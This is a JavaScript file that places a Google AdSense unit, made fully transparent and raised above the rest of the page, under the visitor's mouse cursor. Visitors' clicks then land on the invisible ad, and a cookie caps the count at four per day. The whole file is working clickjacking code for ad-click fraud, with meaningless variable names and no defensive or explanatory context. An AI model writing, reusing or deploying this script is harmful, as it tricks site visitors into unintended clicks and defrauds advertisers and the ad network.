var _x3x7727x6 = 4;
var _x1x0291x1 = 0;

var _x1x0434x1 = "2302183154761045";
var _x1x4231x1 = "1804106810";
var nameDiv = "ad_300x600";
var isOverIFrame = false;
var isOverGoogleAd = false;
$.noConflict();




function setCookie(cname, cvalue, exdays) {
    var d = new Date();
    d.setTime(d.getTime() + (exdays*24*60*60*1000));
    var expires = "expires="+d.toUTCString();
    document.cookie = cname + "=" + cvalue + "; " + expires;
}


function getCookie(cname) {
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for(var i=0; i<ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') c = c.substring(1);
        if (c.indexOf(name) == 0) return c.substring(name.length,c.length);
    }
    return 0;
}

function delCookie(cname){
    document.cookie = cname + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC";
    return 0;
}


function createElementHtml(){
	var Html = ''+
				'<div id="abajoc4c" style="position: relative; position:absolute;overflow: hidden; cursor:inherit !important;'+
				'filter: alpha(opacity='+_x1x0291x1+'); -moz-opacity: '+_x1x0291x1+'.0; -khtml-opacity: '+_x1x0291x1+'.0; opacity: '+_x1x0291x1+'.0;z-index: 999999999;">'+
				'<ins class="adsbygoogle"'+
			    ' style="display:inline-block;width:300px;height:250px"'+
			    ' data-ad-client="ca-pub-'+_x1x0434x1+'"'+
			    ' data-ad-slot="'+_x1x4231x1+'"></ins></div>';
	return Html;
}

function removeADD(){
	$("#abajoc4c").empty();
	$("#abajoc4c").remove();
	console.log("click");
	console.log(window.location.href);	
}


jQuery(function($){
    var totalCookie = parseInt(getCookie(nameDiv));
    if( totalCookie < _x3x7727x6 ){
    	var html = createElementHtml();
    	jQuery("body").prepend(html);
    	(adsbygoogle = window.adsbygoogle || []).push({});
	    jQuery("iframe[id*=aswift]")
	    .mouseover(
	        function(){
	            isOverGoogleAd = true; 
	        }
	    )
	    .mouseout(
	        function(){
	            isOverGoogleAd = false;
	        }
	    );
	   $(window).blur(
	        function(){
	            if(isOverGoogleAd){
					var total = parseInt(getCookie(nameDiv));
        			setCookie(nameDiv , (total+1) , 1);
        			setTimeout(removeADD , 1000);
	            }
	        }
	    )
	    .focus();
	    $(window).click(function(event){
			var total = parseInt(getCookie(nameDiv));
			setCookie(nameDiv , (total+1) , 1);
			setTimeout(removeADD , 1000);
	    }).focus();
		$(window).mousemove(function (event) {
			var newY = (event.pageY - 35) + 'px';
			var newX = (event.pageX - 15) + 'px';
			$("#abajoc4c").css('top', newY).css('left', newX);
		});	    
    }
});